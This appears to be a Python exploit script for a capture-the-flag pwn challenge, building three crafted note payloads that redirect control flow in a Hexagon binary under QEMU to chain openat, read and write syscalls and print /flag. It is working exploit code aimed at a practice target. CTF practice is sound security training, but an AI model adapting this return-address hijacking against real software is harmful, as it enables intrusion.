#!/usr/bin/env python3
"""
Exploit v4: different note layouts for each stage based on observed addresses.
"""
import struct, subprocess, os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88

TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note_stage1():
    """Stage 1: openat("/flag") with restart. Note at 0x4080e4c0."""
    note = bytearray(64)
    # R30_first = 0x4080e4f8
    struct.pack_into('<I', note, 4, 0)           # R5
    struct.pack_into('<I', note, 8, 0)           # R4
    struct.pack_into('<I', note, 12, 0)          # R3 (mode)
    struct.pack_into('<I', note, 16, 0)          # R2 (flags)
    struct.pack_into('<I', note, 20, 0x4080e4e0) # R1 = "/flag" at note[32]
    struct.pack_into('<I', note, 24, AT_FDCWD)   # R0 = -100
    struct.pack_into('<I', note, 28, SYS_OPENAT) # R6 = 56
    note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, 0x4080e4f8) # R30_first → trap0
    struct.pack_into('<I', note, 52, TRAP0)       # R31_first
    struct.pack_into('<I', note, 56, 0x4080e4f0)  # R30_after
    struct.pack_into('<I', note, 60, RESTART)      # R31_after → restart
    return note

def build_note_stage23(sysno, r0, r1, r2):
    """Stage 2/3: read/write with restart. Note at 0x4080e440."""
    note = bytearray(64)
    # R30_first = note[48] addr + 4 = 0x4080e470 + 4 = 0x4080e474
    R30 = 0x4080e474
    # Args at [R30-0x34]..[R30-0x1C] = note[0]..note[24]
    struct.pack_into('<I', note, 0, 0)     # R5 = 0
    struct.pack_into('<I', note, 4, 0)     # R4 = 0
    struct.pack_into('<I', note, 8, 0)     # R3 = 0
    struct.pack_into('<I', note, 12, r2)   # R2
    struct.pack_into('<I', note, 16, r1)   # R1
    struct.pack_into('<I', note, 20, r0)   # R0
    struct.pack_into('<I', note, 24, sysno) # R6
    struct.pack_into('<I', note, 48, R30)   # R30_first
    struct.pack_into('<I', note, 52, TRAP0) # R31_first
    struct.pack_into('<I', note, 56, 0x4080e4f0)  # R30_after
    struct.pack_into('<I', note, 60, RESTART)      # R31_after
    return note

note1 = build_note_stage1()
note2 = build_note_stage23(SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note_stage23(SYS_WRITE, 1, BSS_BUF, 0x100)

input_data = b'3\n' + bytes(note1) + b'\n' + b'3\n' + bytes(note2) + b'\n' + b'3\n' + bytes(note3) + b'\n' + b'5\n'

p = subprocess.run(['./qemu-hexagon', '-strace', './pwn'], input=input_data, capture_output=True, timeout=30)

stdout = p.stdout.decode(errors='replace')
stderr = p.stderr.decode(errors='replace')

print(f"STDOUT: {len(stdout)}B  STDERR: {len(stderr)}B\n")
print("=== Syscalls ===")
for line in stderr.split('\n'):
    s = line.strip()
    if any(kw in s for kw in ['openat', 'read(', 'write(', 'SIG', 'exit', 'flag']):
        print(s)
print("\n=== Output tail (last 500 chars) ===")
print(stdout[-500:])
